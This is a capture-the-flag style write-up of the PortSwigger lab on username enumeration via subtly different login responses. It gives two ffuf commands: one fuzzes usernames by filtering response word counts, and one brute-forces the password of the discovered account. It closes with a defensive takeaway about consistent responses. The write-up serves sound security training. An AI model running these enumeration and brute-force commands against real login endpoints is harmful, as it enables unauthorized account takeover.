# Challenge Name: Username enumeration via subtly different responses 
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Username Enumeration

## 2. Root Cause
The application returns subtly different responses based on whether the username exists, allowing attackers to distinguish valid usernames.
## 3. Attack Surface
`/login`

## 4. Exploit Method
By enumerating usernames using ffuf and analyzing response metrics (e.g., word count), the attacker can identify valid usernames based on subtle differences in responses. Once a valid username is identified, the attacker can perform a password brute-force attack to gain unauthorized access.
## 5. Payload / Technique
```bash
ffuf -u https://0a1200ba0370d4728419d827005d0037.web-security-academy.net/login -X POST -d "username=FUZZ&password=dummy_password" -w ~/Desktop/usernames.txt -H "Content-Type: application/x-www-form-urlencoded" -fw 1335,1344
```
```bash
ffuf -u https://0a1200ba0370d4728419d827005d0037.web-security-academy.net/login -X POST -d "username=agenda&password=FUZZ" -w ~/Desktop/passwords.txt -H "Content-Type: application/x-www-form-urlencoded"
```
## 6. Impact
Unauthorized access to victims account can lead to data loss, data leak, financial loss.
Username enumeration enables attackers to identify valid accounts, which significantly increases the effectiveness of brute-force and credential stuffing attacks, potentially leading to account takeover.
## 7. Reusable Pattern
When testing authentication mechanisms, always analyze differences in server responses (e.g., status codes, response length, word count, timing) to identify potential username enumeration vulnerabilities.
## 8. Key Takeaway
Authentication responses should be consistent regardless of input validity to prevent information leakage about existing users.

